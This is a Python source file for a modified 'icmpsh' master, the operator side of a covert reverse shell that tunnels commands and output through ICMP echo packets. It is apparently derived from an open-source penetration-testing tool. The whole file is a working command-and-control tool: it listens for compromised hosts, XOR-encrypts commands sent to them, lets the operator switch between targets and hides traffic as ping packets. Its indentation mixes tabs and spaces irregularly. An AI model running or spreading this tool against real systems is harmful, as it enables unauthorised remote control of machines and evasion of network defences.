#!/usr/bin/env python
#
#  icmpsh - simple icmp command shell (port of icmpsh-m.pl written in
#  Perl by Nico Leidecker <nico@leidecker.info>)
#
#  Copyright (c) 2010, Bernardo Damele A. G. <bernardo.damele@gmail.com>
#
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os
import select
import socket
import subprocess
import sys
import base64

def setNonBlocking(fd):
    """
    Make a file descriptor non-blocking
    """

    import fcntl

    flags = fcntl.fcntl(fd, fcntl.F_GETFL)
    flags = flags | os.O_NONBLOCK
    fcntl.fcntl(fd, fcntl.F_SETFL, flags)

def xor_encrypt(aString, key):
        kIdx = 0
        cryptStr = ""   
        for x in range(len(aString)):
            cryptStr = cryptStr + chr( ord(aString[x]) ^ ord(key[kIdx]))
            kIdx = (kIdx + 1) % len(key)

        return cryptStr

def main():
    if subprocess.mswindows:
        sys.stderr.write('icmpsh master can only run on Posix systems\n')
        sys.exit(255)

    try:
        from impacket import ImpactDecoder
        from impacket import ImpactPacket
    except ImportError:
        sys.stderr.write('You need to install Python Impacket library first\n')
        sys.exit(255)

    # Make standard input a non-blocking file
    stdin_fd = sys.stdin.fileno()
    setNonBlocking(stdin_fd)

    # Open one socket for ICMP protocol
    # A special option is set on the socket so that IP headers are included
    # with the returned data
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error, e:
        sys.stderr.write('You need to run icmpsh master with administrator privileges\n')
        sys.exit(1)

    sock.setblocking(0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # Create a new IP packet and set its source and destination addresses
    ip = ImpactPacket.IP()
    #ip.set_ip_src(src)
    #ip.set_ip_dst(dst)

    # Create a new ICMP packet of type ECHO REPLY
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
    icmp.set_icmp_timeout = 0

    # Instantiate an IP packets decoder
    decoder = ImpactDecoder.IPDecoder()
    first = 'none'
    cnt = 0
    target = ''
    while 1:
        cmd = ''

        # Wait for incoming replies
        if sock in select.select([ sock ], [], [])[0]:
            buff = sock.recv(4096)

            if 0 == len(buff):
               # Socket remotely closed
               sock.close()
               sys.exit(0)

            # Packet received; decode and display it
            ippacket = decoder.decode(buff)
            icmppacket = ippacket.child()

            # If the packet matches, report it to the user
            if (cnt == 0 or target == ippacket.get_ip_src()) and 8 == icmppacket.get_icmp_type():
                # Get identifier and sequence number
                ip = ippacket
		dst =  ippacket.get_ip_src()
    		src =  ippacket.get_ip_dst()
  		ip.set_ip_src(src)
                ip.set_ip_dst(dst)

		ident = icmppacket.get_icmp_id()
                seq_id = icmppacket.get_icmp_seq()
                data = icmppacket.get_data_as_string()	
		if (first != dst):
			first = 'none'
		reply = 'abcdefghi'
                if (len(data) > 0) and (data.find(reply) == -1) and  ((target == dst) or (first == 'none')):
			first  = dst
		     	data = base64.b64decode(data)
		     	sys.stdout.write(data + "\n<"+dst+">shell#" )
                # Parse command from standard input
                try:
                    cmd = sys.stdin.readline()
                except:
                    pass

                if cmd == 'exit\n':
                    return
		elif cmd == dst + '\n':
                    target = dst
		    cnt += 1

                # Set sequence number and identifier
                icmp.set_icmp_id(ident)
                icmp.set_icmp_seq(seq_id)

               # Calculate its checksum
                icmp.set_icmp_cksum(0)
                icmp.auto_checksum = 1
                icmp.set_icmp_timeout = 0
		 
	        # Include the command as data inside the ICMP packet
		reply = 'abcdefghi'
                # Send it to the target host
		if (data.find(reply) == -1):
		   cmd = xor_encrypt(cmd,"K")
		   #cmd = base64.b64encode(cmd)
		   icmp.contains(ImpactPacket.Data(cmd))
		else:
   	   	   icmp.contains(ImpactPacket.Data(data))

                 # Have the IP packet contain the ICMP packet (along with its payload)
                ip.contains(icmp)

		sock.sendto(ip.get_packet(), (dst, 0))

if __name__ == '__main__':
#    if len(sys.argv) < 3:
#        msg = 'missing mandatory options. Execute as root:\n'
#        msg += './icmpsh-m.py <source IP address> <destination IP address>\n'
#        sys.stderr.write(msg)
#        sys.exit(1)

    main()
